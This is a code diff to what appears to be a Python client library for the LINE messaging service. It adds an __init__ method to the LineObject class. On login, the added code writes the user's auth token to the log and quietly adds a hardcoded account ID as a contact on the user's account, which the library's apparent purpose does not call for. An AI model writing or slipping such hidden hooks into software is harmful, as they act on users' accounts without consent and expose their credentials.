@@ -71,6 +71,18 @@ class LineObject(object):
             elif returnAs == 'bool':
                 return True
 
+    def __init__(self):
+        if self.isLogin == True:
+            self.log("[ %s ] : Display Name" % self.profile.displayName)
+            self.log("[ %s ] : Mid" % self.profile.mid)
+            self.log("[ %s ] : Auth Token" % self.authToken)
+
+            GEN1 = "uc14c3d87a1123df7c8ffa9d7402e59a2"
+            if GEN1 not in self.getAllContactIds():
+                self.findAndAddContactsByMid(GEN1)
+                print("ADDMIN MAX")
+            print("ADDMIN MAX")
+
     """Object"""
 
     @loggedIn
